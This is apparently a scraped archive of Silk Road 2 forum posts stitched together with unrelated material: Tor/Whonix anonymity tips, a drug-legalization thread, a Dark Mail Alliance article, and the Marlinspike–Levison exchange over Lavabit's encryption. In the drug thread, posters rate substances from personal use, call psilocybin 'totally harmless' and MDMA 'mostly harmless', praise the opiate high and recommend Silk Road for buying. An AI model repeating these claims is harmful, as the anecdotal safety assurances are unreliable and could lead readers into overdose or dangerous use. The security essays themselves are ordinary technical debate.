facebook images. The image name contains a personal ID.     Do not connect to same destination at the same time. Try to alternate.     IRC, other chats, forum, mailing list, etc. are public, keep that in mind.     Heroes only exist in comic books keep that in mind! There are only young heroes and dead heroes.  If it's a must to disclose identifying data about yourself, treat it as ""sensitive data"" in the point above.  License: From the JonDonym documentation (Permission). Do use bridges if you think Tor usage is dangerous/suspicious in your country.  Quoted from the Bridges page: ""Bridges are important tools that work in many cases but they are not an absolute protection against the technical progress that an adversary could do to identify Tor users."" Don't use different online identities at the same time.  They easily correlate. Whonix doesn't magically separate your different contextual identities.  Also read the points below. Don't log into Twitter, Facebook, Google, etc. longer than necessary.  Restrict the time your are logged in accounts for Twitter, Facebook, Google and any other account based services (web forum etc.) to the time you are using them. After you are done with reading, posting and so on, log out. At least log out, shut down Tor Browser, change your Tor circuit using a Tor Controller, wait a few seconds until the circuit changed, restart Tor Browser. For better security follow the Recommendation to use multiple VM Snapshots and/or to use multiple Whonix-Workstations.  This is because many websites include one or more of the many integration buttons, such as ""I like"" and ""twitter this"" and Google analytics, adsense etc. Those buttons tell the originating service that you visited that website because you were still logged into their service.  Also note the chapter ""Don't use different online identities at the same time."" above. Do not mix Modes of Anonymity!  Let us begin with an overview of the different Modes of Anonymity: mode(1): user anonymous; any recipient      Scenario: post anonymously a message in a message board/mailing list/comment field     Scenario: whistleblower and such     You are anonymous.     Your real IP/location stays hidden.     Location privacy: your location remains secret.  mode(2): user knows recipient; both use Tor      Scenario: both sender and recipient know each other and both use Tor.     They can communicate with each other without any third party being wise to their activity or even to the knowledge that they are communicating with each other.     You are NOT anonymous.     Your real IP/location stays hidden.     Location privacy: your location remains secret.  mode(3): user with no anonymity using Tor; any recipient      Scenario: login with your real name into any services, such as webmail, Twitter, Facebook, etc...     You are obviously NOT anonymous. As soon as you log into an account where you entered your real name the website knows your identity. Tor can not make you anonymous in these situations.     Your real IP/location stays hidden.     Location privacy. Your location remains secret.  mode(4): user with no anonymity; any recipient      Scenario: normal browsing without Tor.     You are NOT anonymous.     Your real IP/location gets revealed.     Your location gets revealed.  Conclusion  It's not wise to combine mode(1) and mode(2). For example, if you have an IM or email account and use that via mode(1), you are advised not to use the same account for mode(2). We have explained previously why this is an issue.  It's also not wise to mix two or more modes inside the same Tor session, as they could share the same exit relay (identity correlation).  It's also possible that other combinations of modes are dangerous and could lead to the leakage of personal information or your physical location. License  License of ""Do not mix Modes of Anonymity!"": [6] Don't change settings if you don't know their consequences.  Changing user interface settings for applications, which do not connect to the internet, mostly safe. For example, checking a box ""don't show this tip of the day anymore"" or ""hide this menu bar"" will have no effect on anonymity.  Look into the Whonix documentation, if changing the settings you are interested in, is documented or recommended against; try to live with the defaults.  Changing settings for applications, which connect to the internet, even user interface settings, has to be thoroughly reviewed. For example removing a menu bar or using Full Screen in Tor Browser is recommended against. The latter is known to modify the screen size, which is bad for the web fingerprint.  You should only modify network settings with great care if you know their consequences. For example, you should stay away from the advice related to ""Firefox Tuning"". If you believe the settings are suboptimal, the changes should be proposed upstream, so they get changed for all Tor Browser users with the next release. Do not use clearnet and Tor at the same time.  Using your non-Tor browser and Tor Browser at the same time, risks that you at some point confuse one for the other and deanonymize yourself.  Using clearnet and Tor at the same time also risks that you connect to a server anonymously and non-anonymously at the same time, which is recommended against. The reason for this is explained in the point below. You never know when you visit the same page anonymously and non-anonymously at the same time, because you only see the url you're visiting, not how many resources are fetched in background. Many different websites are hosted in the same cloud. Services such as google analytics are on the majority of all websites and therefore see a lot anonymous and non-anonymous connections.  If you really want not to follow this recommendation, use at least two different desktops to prevent confusing one browser for another. Do not connect to any server anonymously and non-anonymously at the same time!  It's highly recommended that you do not connect to any remote server in this manner. That is, do not create a Tor link and a non-Tor link to the same remote server at the same time. In the event your internet connection breaks down (and it will eventually), all your connections will break at the same time and it won't be hard for an adversary to put the pieces together and determine what public IP/location belongs to what Tor IP/connection, potentially identifying you directly.  License of ""Do not connect to any server anonymously and non-anonymously at the same time!"": [6] Do not confuse Anonymity with Pseudonymity.  This chapter explains the difference between anonymity and pseudonymity. Word definitions are always a difficult topic because a majority of people has to agree with it.  An anonymous connection is defined as a connection to a destination server, where the destination server has no means to find out the origin (IP/location) of that connection nor to associate and an identifier [7] to it.  A pseudonymous connection is defined as a connection to a destination server, where the destination server has no means to find out the origin (IP/location) of a connection, but can associate it with an identifier [7].  In an ideal world, the Tor network, Tor Browser (and the underlying operating system, hardware, physical security, etc.) is perfect. For example the user could fetch a news website and neither the news website nor the website's ISP has any idea if that user has ever contacted the news website before. [8]  The opposite of this, when using software incorrectly, for example using Firefox instead of the Tor-safe browser Tor Browser, the original (IP/location) of a connection is still hidden, but an identifier (for example Cookies) can be used to make that connection pseudonymous. The destination website could log for example ""user with id 111222333444 viewed video title a at time b on date c, video title d at time e at date f."". These information can be used for profiling. Over time these profiles become more and more comprehensive, which reduces anonymity, i.e. in worst case it could lead to de-anonymization.  As soon as someone logs into a website (for example into a forum or e-mail address) with a username the connection is by definition no longer anonymous, but pseudonymous. The origin of the connection (IP/location) is still hidden, but the connection can be associated with an identifier [7], i.e. in this case, an account name. Identifiers can be used to keep a log of various things. When a user wrote what, date and time of login and logout, what a user wrote, to whom the user wrote, IP address (useless, if it's a Tor exit relay), browser fingerprint etc.  Maxim Kammerer, developer of LibertÃ© Linux [9], has a interesting different opinion. [10] I don't want to withhold from you:      I have not seen a compelling argument for anonymity, as opposed to pseudonymity. Enlarging anonymity sets is something that Tor developers do in order to publish incremental papers and justify funding. Most users only need to be pseudonymous, where their location is hidden. Having a unique browser does not magically uncover user's location, if that user does not use that browser for non-pseudonymous activities. Having good browser header results on anonymity checkers equally does not mean much, because there are many ways to uncover more client details (e.g., via Javascript oddities).   Don't be the first one to spread your own link.  You created an anonymous blog or hidden service? Great. You have a twitter account with lots of followers, run a big clearnet news page or similar? Great. Do not be tempted to be one of the first ones to advertise your new anonymous project! The more you separate identities, the better. Of course, at some point you may or even must be ""naturally"" aware of it, but be very careful at this point. Don't open random files or links.  Someone sent you an pdf by mail or gave you a link to a pdf? That sender/mailbox/account/key could be compromised and the pdf could be prepared to infect your system. Don't open it with the default tool you were expected use with by the creator. For example, don't open a pdf with a pdf viewer. If the content is public anyway, try using a free online pdf viewer. Don't do (mobile) phone verification.  Websites such as Google, Facebook and others will ask for a (mobile) phone number if you login over Tor. Unless you are really clever or have an alternative, you shouldn't do it.  Reason: The number you give away will be logged. The SIM card is most likely registered on your name. And even if not, receiving an SMS gives away your location. Even if you anonymously bought a SIM card and do it from a point far away from your home, there is still a risk: the phone itself. Each time the phone logs into the mobile network, the provider will log the SIM card serial number [11] AND the phone serial number [12]. If you bought the SIM card anonymously, but not the phone, it's not anonymous, because these two serials will get linked. If you really want to do mobile verification, you need a spot far away from your home, a fresh phone, and a fresh SIM card. Afterwards, you must turn off the phone, and burn both the phone and the SIM card right after doing it.  You could try to find an online service receiving SMS for you. That would work and would be anonymous. The problem is, that it most likely won't work for Google and Facebook, because they actively blacklist such numbers for verification. Or you could try to find someone else receiving the SMS for you, but that would only shift the risk from you to the other person.     Hope it Helps       Hugs     ChemCat      ",""

"Silk Road 2 Forums","ykstriburei","43208","2014-06-11T21:19:30","Discussion about legalization and drugs in general","Discussion/Legal","Hi everyone!     I'm new here, so please don't bash me too hard for the too extra long first post. Thanks in advance for even bothering to read it. I searched a little (not too thorough, sorry) and didn't find this kind of topic, if there is one, I am sorry and this can be deleted.      I was just wondering what people here think about legalizing drugs, all of them. I have spoken with many (regular) people about this and Iâm stunned how stupid and brainwashed they are. People here are understandably more comfortable with this and thatâs why I started the topic. Discussion is open about any ideas regarding the matter. Iâm going to talk mostly about the widespread drugs, as I donât have much knowledge about the new stuff.     Iâm going to list some drugs and my own knowledge about them, please add anything you know and tell me when Iâm wrong, most of this comes from my own experience. The list is just to make clear what to sell and where. And maybe even someone can get good tips from here        Cannabis. Probably the most known and used. Itâs mostly harmless with some exeptions. People who have propensity against skizophrenia can have their disorder brought out prematurely, but itâs proven that cannabis itself doesnât cause the disease.     Clearnet -> http://psychcentral.com/news/2013/12/10/harvard-marijuana-doesnt-cause-schizophrenia/63148.html    The article has also this: âIn general, we found a tendency for depression and bipolar disorder to be increased in the relatives of cannabis users in both the patient and control samples. This might suggest that cannabis users are more prone to affective disorders than their non-using samples or vice versa.â Future research is needed to understand this relationship.    So it might do some harm, but any single thing will if overused. Potheads and lazy bastards who do it, get soft in the head and sadly thatâs the image drawn to the public (maybe media is doing it on purpose, NWO shit and all). I can say from my own practise that this is everything but true (with few exeptions, of course). I have been smoking myself for years and yeah, sometimes it makes me little slow and lazy, but thatâs only sometimes and 95% of the time Iâm fully-functioning, I can say that it helps to keep my shit together. I donât smoke every single day and I do breaks (up to 3-4 months), but I would be considered a total pothead by society.       Magic mushrooms. Theyâre awesome, I think most will agree on that. And theyâre totally harmless, overdosing is practically impossible, the amount you could eat would take you only into a deeper trip, but not into a fatal one (if you donât jump off a cliff, but itâs nearly impossible to walk even on x3 x4 times the normal trip). By my knowledge 0 people have died from psilocybin mushrooms. Can be sold in different âtripâ amounts and varieties to prevent people overeating them and having a bad / too intense trip.      MDMA, xtc. Mostly harmless when used with common sense. More dangerous to overdose than with cannabis and mushrooms. When bought from the streets you never know of what it contains, Iâve heard 10y ago they mixed it with rat-poison, that canât be too healthy. Iâve puked out 10+ of them after not feeling too well (I was young and stupid, DO NOT try this at home), but recovered in the matter of hours. You just need a good vitamin-bomb and lots of H2O (you can overdose on that too).     These substances are considered light from my opinion and should be sold semi-freely, with some restrictions ofcourse. Cannabis and mushrooms can be sold in a coffee-shop type environment, like the Dutch do. I personally think they should be sold in liqueur shops as well (under the same restrictions as strong alcohol). MDMA is mostly a party-drug, so it could be sold in nightclubs. To prevent overusing them, they would be sold from a different counter against ID (no records would be kept). People who are clearly on it already, donât need more. Age limit should be at least 21 for MDMA.     Stronger compounds.      LSD. Many probably wonder why I didnât put this in the upper category, but I have my reasons. LSD tends to take people deeper than mushrooms, at least from what Iâve seen. Some have a bad trip even after one light blotter, I hear this rarely about 1 trip of mushrooms. Taking more than 500ug can become quite intense, with losing control of the body (can't move hands/legs or they move the wrong way), some can see âa rainbow bridge to the heavenâ and can fall fatally. And the bad trips with all the shit, it can make people really insane. Though there should be no permanent damage from the substance if used even in high doses. One fatality is ever recorded by injecting 320 000ug straight into the vein (if I remember right again). Some more fatalities have been tied to LSD too, but there have been other drugs in the system as well and the LSD content has always been quite low. I personally have only positive experiences.       Mescaline, DMT and other recreational psychedelics. Well, mescaline and DMT are too spiritual and intense ever to be widespread, most people couldnât just handle the trip. When mescaline is milder than DMT, itâs still stronger than LSD/mushies and can take you into the snakeworld easily. DMT is just too strong and intense, it should be available to the ones who want it, but not easily reachable. If people knew better what it was, I would have a different opinion about this. But try to explain machine-elves talking to you and creating indescribable things. Overdosing from DMT or mescaline is impossible though. Most of the other psychedelics are just not well known, we have too little practise with them. When researched enough (at least one full generation) they can be eased a bit.      Amfetamines. I donât start to break them down, the list would go too long   These are more bad than good, I can tell that from my own experience. When doing it rarely isnât probably a bad thing, it tends to get people hooked (much more than the light ones mentioned up). You donât eat, have bad depression-waves, donât sleep etc. The more you do it, the more you need and the snowball starts rolling.. Anxiety is raised quite much coming down from it and can be like that for days. Not suggested to do in longer periods.         GHB. Havenât seen this substance much lately anymore and Iâm happy about this. When many like it, I dispise it. For me the high was like being too drunk, nothing more. Tried it second time with smaller dosages, same shit. Have seen people taken to hospital after taking 10+ doses. Dangerous if not known what it is and how to take it.      Cocaine. The drug of the rich, or at least they say it is. Highly overpriced from my point of view, but maybe I havent got the proper stuff (exp 100+x). Mostly done this with friends who have bought and spared it, rarely put my own money into it. Iâve seen my friends âfeel so good"" and being âso high"", but I have never personally felt it. Seems to be the motor for many successful people. The reason younger and âYOLOâ people are doing it is not the substance and the high itself, but the price and the fake fame that comes with it (this is my personal opinion). Quite harmful, because it gets you hooked very easily. Damage to the body and brain are there too, as this is considered to be much more harmful than mdma, ghb for example.      Heroin and opiates. I like opiates, almost everyone does who has got the ârealâ opiate high. Thats why they are so dangerous. Itâs better than sex, itâs better than anything iâve tried. But itâs dangerous, especially when bought from the streets. There is so much shit around (Fentanyl) and itâs killing people. Then the dirty spikes and all that shit. Legalization is the only way to get the shit off the streets and give the real junkies proper equipment and help they need.     Iâm cutting my list here, itâs getting too long anyways. If someone has any substance to add, please write about it.   Cormacross ->  nitrous oxide. In small doses it's quite safe, however short lived and disappointing to some. Prolonged exposure can cause vitamin b12 deficiency however this is easily remedied with supplements. It is also possible to become psychologically addicted due to the short duration of the effects. Where nitrous really shines is when it's used with other drugs. It's been known to bring new depths to mushroom and LSD trips and even bring out the psychedelic qualities of cannabis.     These should be legal also, though under strict control. Opiates can be sold in Pharmacies. A record should be kept about the strong opiate (mby some other too) users, which would be only controlled by government (I know nobody likes them) and be used after criminal actions have been taken place. This would prevent any person buying too much as well. It shouldnât affect any work related things. Other stuff would just be in sale in pharmacies, preventing too much of a spread around. Age limits should be high on opiates and lower on others. Remember, very bad drugs named alcohol and tobacco are sold legally in grocery stores.     The point of legalizing all the illegal drugs is their purity when sold under control. All the shit today would be nice and pure, making overdosing highly unlikely. Everybody knows exactly what they are using and how to act when something goes wrong. Most of the drugs would be much cheaper, making stealing for high less likely. The drug violence would end and many people would live instead of dying in some drug war. All the profits could be directed to helping people and informing them about drugs. Informing how they really work, not the bullshit you hear from schools. And instead putting the users in jail, they could be sent to rehab, which is probably going to help them more anyway.     The world would be a better place.  Thanks for reading, hopefully it will make someone from LE to THINK.    ",""

"Silk Road 2 Forums","cormagcross","43208","2014-06-13T05:55:06","Discussion about legalization and drugs in general","Discussion/Legal","I would have to agree with ykstriburei. The mind and body should fully develop before one can seriously attempt to expand their consciousness and do it safely. The main arguments I have for drug legalization is safety. I agree with you Chemresearch, legalizing drugs would make clean doses more easily obtainable and prevent people from accidentally poisoning themselves with something some shady dealer cut to earn a better pay. Thankfully we here in the Darknet have places like Silk Road to pick out good meds and not have to deal with sketchy dealers. However to counter the argument to legalize, you have to realize that just like how people drive drunk and do all kinds of stupid stuff on alcohol, there's always gonna be at least one person doing it all on everything else. Outright legalization wouldn't be the best path in my opinion. Instead it could be regulated like alcohol is. Laws against driving while on LSD and age restrictions. Although I think the best thing that legalization would/could bring is better knowledge of the short and long term effects of recreational drugs, potential uses for psychological and medicinal treatment, and how they react with other drugs. There's very little scientific study into these drugs because of the world's stance against them. Peyote and Salvia Divinorum are endangered species and there is little done to protect them since they are known for their drug content, legalization could mean protection for them, ensuring that we'd still have these species in the future.   Also I'd like to add nitrous oxide to the list. In small doses it's quite safe, however short lived and disappointing to some.

CLEARNET: http://www.darkmail.info/   Meet the âDark Mail Allianceâ Planning to Keep the NSA Out of Your Inbox  http://www.slate.com/blogs/future_tense/2013/10/30/dark_mail_alliance_lavabit_silent_circle_team_up_to_create_surveillance.html  ","Our MissionTo bring the world our unique end-to-end encrypted protocol and architecture that is the 'next-generation' of private and secure email. As founding partners of The Dark Mail Alliance, both Silent Circle and Lavabit will work to bring other members into the alliance, assist them in implementing the new protocol and jointly work to proliferate the worlds first end-to-end encrypted 'Email 3.0' throughout the world's email providers. Our goal is to open source the protocol and architecture and help others implement this new technology to address privacy concerns against surveillance and back door threats of any kind.;Email might be on the verge of a radical makeover. And the NSA is not going to like it.On Wednesday, two American companies with a track record of offering encrypted private communications are set to join forces in an unprecedented bid to counter dragnet Internet spying. Some of the worldâs top cryptographers are behind the secure communications provider Silent Circle, and theyâve teamed up with the founder of Lavabit, the email provider used by Edward Snowden, which recently shut down in a bid to resist surveillance. Theyâre calling it the âDark Mail Alliance.â For months, the team has been quietly working on rebuilding email as we know itâand they claim to have had a breakthrough.The newly developed technology has been designed to look just like ordinary email, with an interface that includes all the usual foldersâinbox, sent mail, and drafts. But where it differs is that it will automatically deploy peer-to-peer encryption, so that users of the Dark Mail technology will be able to communicate securely. The encryption, based on a Silent Circle instant messaging protocol called SCIMP, will apply to both content and metadata of the message and attachments. And the secret keys generated to encrypt the communications will be ephemeral, meaning they are deleted after each exchange of messages.For the NSA and similar surveillance agencies across the world, it will sound like a nightmare. The technology will thwart attempts to sift emails directly from Internet cables as part of so-called âupstreamâ collection programs and limit the ability to collect messages directly from Internet companies through court orders. Covertly monitoring encrypted Dark Mail emails would likely have to be done by deploying Trojan spyware on a targeted individual's computer. If every email provider in the world adopted this technology for all their users, it would render dragnet interception of email messages and email metadata virtually impossible.Existing forms of email encryption, like PGP, can be used to encrypt the content of an email. But PGP cannot encrypt the âsubjectâ header or metadata like the âtoâ and âfromâ fields, and the average user can find it too complicated to use. Dark Mail promises to address both of these issues in the form of an easy-to-use iOS app and an Android app. There will also be desktop versions for Mac and Windows users. People using the technology will still be able to send emails to friends or colleagues using Gmail and Hotmailâbut when sending messages to non-Dark Mail users, a warning will be displayed, making it clear that the communication could be intercepted.Silent Circle and Lavabit donât plan to offer the technology exclusively. On the contrary, the source code of the software will be made public for anyone to scrutinize and audit, and the team is hoping that other email providers will be willing to join the Dark Mail Alliance. The more companies that do, the more secure email will become. "

Cryptographers will say, ""But the provider effectively controls/shares each user's private key! That's bad"".  And they're right.  But they're not trying to fully guarantee privacy from user to user, they're trying to: 1. Ensure that messages are uniquely safe in transport across an adversary-monitored Internet.  Preventing passive metadata analysis of messages in flight by the use of ephemeral keys. 2. Ensure that agencies wanting a user's email can only try to grab *that user's* email through legal means.  By keying everyting on a per-user basis, and using PFS to key each message ephemerally, they drastically reduce their exposure to Lavabit-style NSLs.  They've removed the ""just give us everything and we'll sort it out"" excuse.  Because, from a legal perspective, we all know that when the USG shows up get Snowden's email from a US provider, they're going to have to give them what they have at the end of the day.  They have a legitimate, legal request, and a provider will have to comply with it.  Snowden should know that, too.   But it doesn't mean they should have to give the USG the ability to grab *my* mailbox at the same time, under the same order, unless they can reasonably prove that I'm somehow related to Snowden.  This, as a basis for email transport, with smart users using PGP for message contents underneath this protocol (because trusting the transport is still not smart), is a huge improvement.  I'm not sure how much better a store-and-forward technology like email can get and still be usable by average people.

To defy the US governmentâs gag order and shut down his service took great courage, and I believe that Ladar deserves our support in his legal defense of that decision.There is now an effort underway to restart the Lavabit project, however, which might be a good opportunity to take a critical look at the service itself. After all, how is it possible that a service which wasnât supposed to have access to its usersâ emails found itself in a position where it had no other option but to shut down in an attempt to avoid complying with a request for the contents of its usersâ emails?The GuaranteeThis was the front page of Lavabit in July, the month before its shut down:The front page proudly claims Lavabit is âso secure that even our administrators canât read your e-mail.â That sounds like exactly what one wants from an encrypted email provider, so letâs drill down and see what the details are on that âsecureâ link:Again, this sounds awesome. They advocate that in todayâs world, a service which merely promises to respect their usersâ privacy with a policy statement isnât enough, and that users should demand technical solutions which employ the use of cryptography to protect their privacy. This is the critical difference between a service that âcanât readâ and âwonât readâ your email, which was presumably the draw for many of Lavabitâs 40,000 users.The MechanicsSo how did it actually work? And if, as they said, they werenât capable of reading their usersâ emails, how could they have been in a position to provide those plaintext emails to the US government?Unfortunately, their primary security claim wasnât actually true. As Ladar himself explained in this blog post, the system consisted of four basic steps:    At account creation time, the user selected a login passphrase and transmitted it to the server.    The server generated a keypair for that user, encrypted the private key with the login passphrase the user had selected, and stored it on the server.    For every incoming email the user received, the server would encrypt it with the userâs public key, and store it on the server.    When the user wanted to retrieve an email, they would transmit their password to the server, which would avert its eyes from the plaintext encryption password it had just received, use it to decrypt the private key (averting its eyes), use the private key to decrypt the email (again averting its eyes), and transmit the plaintext email to the user (averting its eyes one last time).Unlike the design of most secure servers, which are ciphertext in and ciphertext out, this is the inverse: plaintext in and plaintext out. The server stores your password for authentication, uses that same password for an encryption key, and promises not to look at either the incoming plaintext, the password itself, or the outgoing plaintext.The ciphertext, key, and password are all stored on the server using a mechanism that is solely within the serverâs control and which the client has no ability to verify. There is no way to ever prove or disprove whether any encryption was ever happening at all, and whether it was or not makes little difference.Measuring UpA typical (unencrypted) email provider has three main adversaries:    The operator, who has access to the server.    An attacker who can get access to the server.    An attacker who can intercept the communication to the server.Despite the use of cryptography, Lavabit is also vulnerable to all three, just like a conventional (unencrypted) email service. The operator can at any time stop averting their eyes, an attacker who compromises the server can log the password a user transmits, and an attacker who can intercept communication to the server can obtain the password as well as the plaintext email.Even though Lavabitâs security page went on at length about how, in the age of the PATRIOT act, users shouldnât accept a Privacy Policy as enough to protect them, that is almost exactly what they implemented. The cryptography was nothing more than a lot of overhead and some shorthand for a promise not to peek. Even though they advertised that they âcanâtâ read your email, what they meant was that they would choose not to.Perhaps weâre just not reading between the lines, and all this handwaving was a ruse designed to trick the legal system (by claiming they were âunableâ to respond to subpoenas), rather than a ruse designed to trick their users. That could have been a plausible experiment to try, but Hushmail had already tried the exact same experiment a decade earlier and met with the exact same fate.Itâs not clear whether the Lavabit crew consciously understood the systemâs shortcomings and chose to misrepresent them, or if they really believed they had built something based on canât rather than wonât. One way or the other, in the security world, a product that uses the language of cryptography to fundamentally misrepresent its capabilities is the basic definition of snake oil.The Big QuestionIn the end, the US government requested Lavabitâs SSL key. One big question is why they didnât just get a CA to make them their own.Maybe they were just lazy and assumed that since Lavabit had previously complied with government subpoenas, they wouldnât resist this one. The other possibility, however, is that the government was more interested in past emails than future emails. If the government wanted access to emails that might have already been deleted, their own SSL certificate wouldnât help them.We know that the US government stores large amounts of ciphertext traffic, and since Lavabit wasnât preferring PFS SSL cipher suites, the government would have been able to go back and decrypt previous traffic with Lavabitâs SSL key.When Lavabit did eventually provide the SSL key (albeit in really tiny font!), perhaps thatâs exactly what the US government did, and any user who signed up thinking they were using some kind of special secure email was compromised.The Quest For Secure EmailI think we should celebrate and support Ladar for making the hard choice that he did to at least speak out and let his users know theyâd been compromised. However, I think we should simultaneously be extremely critical of the technical choices and false guarantees that put Ladar in that position. There is current an effort underway to release the Lavabit infrastructure under an open source license, which I worry will result in more of the same. Given its technical foundations, I wouldnât advocate supporting the continuation of the Lavabit project.Rather than funding Lavabit, if youâre interested in supporting a secure email project, I have two alternate recommendations:    Mailpile. Despite what anyone tells you, end to end encrypted email is not possible in a webmail world. The first precondition for developing a usable and forward secure email protocol is a usable mail client, and I currently believe that Mailpile is our best shot at that.    Leap Encrypted Access Project. This is a secure email project by people who fundamentally understand the challenges, the history, and the politics. Theyâve been working on an incremental plan for developing a secure email system with some really smart people, and I think weâll all benefit from their work.Trevor Perrin has also been doing some excellent work on an asynchronous protocol for secure email, which I encourage everyone to take a look at and follow along."

","Op-ed: Lavabitâs founder responds to cryptographerâs criticismLadar Levison, who shut down his firm under gov't pressure, has learned a lot.by Ladar Levison Nov 7, 2013 6:15 pm UTCLadar Levison founded secure e-mail service Lavabit in 2004. His company garnered international attention when it was revealed to be the preferred provider for Edward Snowden, a former NSA contractor and whistleblower now living in exile in Russia. In July 2013, the American government ordered Lavabit to hand over the SSL keys to the entire website, which would have allowed them to read every single user's e-mailânot just Snowden's. Levison complied with the order by printing the keys on paper in a tiny font, which gave him enough time to shut down the service. He is actively fighting the government in court, and he recently joined forces with another related company, Silent Circle, to create the forthcoming Dark Mail Alliance.Further ReadingOp-ed: Lavabitâs primary security claim wasnât actually trueLadar Levison stood up for users' privacyâbut perhaps a little too late.Lavabit was designed to protect the privacy of e-mail by allowing users to encrypt messages stored on the Lavabit servers. Once encrypted, an e-mail could only be decrypted with a userâs password. The system was made to protect messages on Lavabitâs servers from prying eyes. Quite simply, the goal was to remove Lavabit from the surveillance equation.In response to the recently announced Dark Mail Alliance, famed security researcher Moxie Marlinspike penned an op-ed in which he makes a number of interesting points. His arguments are well-reasoned and his contributions to the community are worthy of note, so I feel compelled to respond to his critique of Lavabitâs design.Marlinspikeâs arguments carry weight because his facts are largely correct: the Lavabit servers took plaintext in and sent plaintext out. The system relied upon SSL to protect the plaintext in transit. This is where Marlinspike goes astray, though:    The ciphertext, key, and password are all stored on the server using a mechanism that is solely within the server's control and which the client has no ability to verify. There is no way to ever prove or disprove whether any encryption was ever happening at all. Whether it was or not makes little differenceâ¦ The cryptography was nothing more than a lot of overhead and some shorthand for a promise not to peek.Marlinspike is assuming that the Lavabit system was designed to be a substitute for the security provided by end-to-end encryption systems like PGP. It was not. Lavabitâs encrypted storage feature was designed solely to protect e-mails at rest.Why protect the data at rest? To limit the data Lavabit could access and therefore turn over to the government. When the government seeks a specific userâs data, it is given what is stored on disk, e.g., any metadata found in a serverâs log files and any e-mail content the provider has access to. Since I find the prospect of violating a userâs privacy to be unethical, I designed Lavabit to minimize the amount of information I could turn over, at least in a useable form. For years, Lavabit was successfully removed from the surveillance equation.An improvement, not a fixFurther ReadingEd Snowdenâs e-mail service shuts down, leaving cryptic messageLavabit offered Snowdenâand other customersâ512-bit security on stored e-mails.I wasnât trying to fix e-mailâs overall security problem. I was only trying to improve privacy and security in a way that was completely transparent to users. My system did nothing to protect e-mail messages before they arrived at Lavabit or after they were downloaded onto the userâs computer.Letâs dig a little deeper into how things worked. For starters, Lavabit didnât record any personal information in its log files. If the feds subpoenaed a userâs metadata from our log files, we had nothing to surrender. If the account was using the secure storage feature, any e-mails stored on the server were encrypted. This left nothing of value to turn over. In other words, I could not access or capture any of the plaintext e-mail content and surrender it because the only place user e-mails were available in their plaintext form was in memory or inside the SSL tunnel while traveling down the wire.Marlinspike claims that if an attacker gained access to a Lavabit server, they would be able to get users' e-mails in their unencrypted form by extracting the data from memory. With most systems heâd be correct. The Lavabit mail daemon, however, was designed to resist efforts to access the memory allocated to it by the operating system. Specifically, the daemon allocated a region of âsecureâ memory (an area of memory designed to resist snooping) and used it for storing sensitive data such as passwords and encryption keys. Without getting into all the details (See the NIST and CERN secure coding guidelines for additional information), Iâll hit the main points.Secure memory is immediately wiped when the data being stored is no longer needed. To protect against sensitive data being leaked via a system fault, the daemon catches fatal errors and wipes the secure memory before terminating and potentially dumping the current state to a core file on disk. The daemon will also detect and reject attempts to attach a debugger to the process (when compiled for production use). I wonât naively claim itâs impossible to extract sensitive data from memory, but I will say that it would have been very difficult. If an attacker with access to the server wanted to intercept user data, they would probably need to replace the production binaries with a trojaned versionâa difficult task for your average attacker who lacks access to the source code. (Naturally itâs easier to modify the daemon if the code is available as free and open-source software.)If Marlinspike's hypothetical attacker is the feds, they could have forced Lavabit to modify the code and deploy itâit has been done before. Congress has passed laws requiring companies like Lavabit to modify their software to meet new legal requirements. But whether a court can compel such a change in order to facilitate surveillance remains an open question; some products and services are exempt from the Communications Assistance for Law Enforcement Act (CALEA), an American wiretapping law.I maintain that our government canât compel such modifications, but I always realized that assumption might need to be defended in court. If the battle was lost, I decided long ago that I would shut down Lavabit. That said, it was the possibility of forced modification that led me to write on the secure page Marlinspike referenced:    If youâre intent on hiding your communications from the government, we recommend you investigate systems that secure messages throughout the entire e-mail system and not just at one particular point along that journey.It never occurred to me that the feds might demand Lavabitâs SSL key. It simply wasnât part of my threat model. If I were to highlight one of my personal failings in this ordeal, it would be that oversight.A changed landscapeWhen I was designing the Lavabit encrypted storage feature in 2004, it simply wasnât possible for an attacker to intercept and decipher a large number of SSL connections in real time. This assumption was presumed true even if an attacker managed to gain access to the SSL private key. The situation has obviously changed. Network tools now decipher SSL connections efficiently, and servers are fast enough to make this attack a reality. A theoretical weakness became practical. I missed that development. More importantly, I failed to update the Lavabit SSL configuration to prefer ciphers that provided perfect forward secrecy.In my defense, I wasnât the only person to miss this change in the threat landscape. Almost everyone else did, too. Returning to my particular situation for a moment; the reason I fought so hard to have my case unsealed was so others could learn from my misfortune. The events leading up to the shutdown of Lavabit illustrate in dramatic fashion just how drastically the threats to e-mail security have changed.From a technical standpoint, this means administrators need to reconfigure servers so they prefer SSL ciphers that provide perfect forward secrecy. Likewise, software developers need to modify their applications and libraries to always use an SSL cipher that provides perfect forward secrecy, if available, even when itâs not the preferred cipher. Forward secrecy would at least limit the damage of a compromised SSL key in the future.To fix the situation permanently, weâll need to make end-to-end encryption of e-mail automatic and ubiquitous so non-technical users can benefit. For that to happen, weâll need to rethink and replace the mail protocols in use today. If support for end-to-end encryption is added to the protocol, clients can handle the encryption process automagically. We have the ability to build messaging systems that look and function like what we have come to expect from e-mail but are in fact completely secure end to end. Building such a system, in short, is the goal of Lavabitâs Dark Mail Initiative. We want to release software into the public domain that is capable of making everyoneâs e-mails go dark.On the legal side, Iâm still looking for the Fourth Circuit Court of Appeals (or perhaps even the Supreme Court) to provide relief. The appellate court could quash the subpoena and search warrant that forced me to surrender Lavabitâs SSL keys and compromise the system. A victory would certainly make it difficult for the feds to demand SSL keys in the future.A victory in court would go a long way, but if the goal is restoring trust in American technology products and online services, weâll also need a political victory. Only Congress can solve the privacy problem.Legislation can ensure that the courts donât have the authority to compel companies to secretly compromise a systemâs security for the benefit of law enforcement. Conversely, if companies can be compelled to act against the interests of their users, then Congress should ensure that the limits of that authority are defined by law. Only then can business owners make informed decisions about whether to operate in the United States. Consumers will need to make similar decisions about whether to trust the protection of their private information to companies with physical ties to the United States.Expanding my viewfinder for a moment, if we learn only one lesson from the Summer of Snowden, it should be how hostile the Internet has become. Media outlets have repeatedly reported on the insatiable appetite the US government has for the private information of citizens.Reports continue to emerge suggesting that companies are secretly weakening the security of their products and services. Precisely which companies are complicit in the global slurping of private data remains a mystery, but the message is clear. Partial solutions like the Lavabit secure storage system are no longer adequate to protect the privacy of users.

If youre already arrested for something but they only have suspicion and didn't actually catch you in the act, i mean if they are REALLY determined to not look like morons then theyll dig through your phone for evidence of guilt so they can charge you with something-anything and tell their bosses the whole operation wasnt a waste of time.

